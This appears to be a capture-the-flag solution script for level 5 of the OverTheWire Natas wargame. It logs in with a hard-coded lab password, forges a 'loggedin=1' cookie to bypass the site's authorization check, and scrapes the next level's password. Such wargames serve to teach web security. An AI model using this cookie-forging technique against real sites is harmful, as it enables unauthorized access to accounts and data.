import requests
import re

"""
Explanation:
If you see the site's cookies, you see a cookie called "loggedin" set to 0 which typically represents false in programming. So when you set the value from 0 to 1 (means true in programming), you become authorized!
"""

# Authentication
username = "natas5"
password = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"

# URL to users.txt
url = f"http://{username}.natas.labs.overthewire.org"
cookies = dict(loggedin="1")

response = requests.get(url, auth=(username, password), cookies=cookies)
content = response.text

print(re.findall("The password for natas6 is (.*)</div>", content)[0])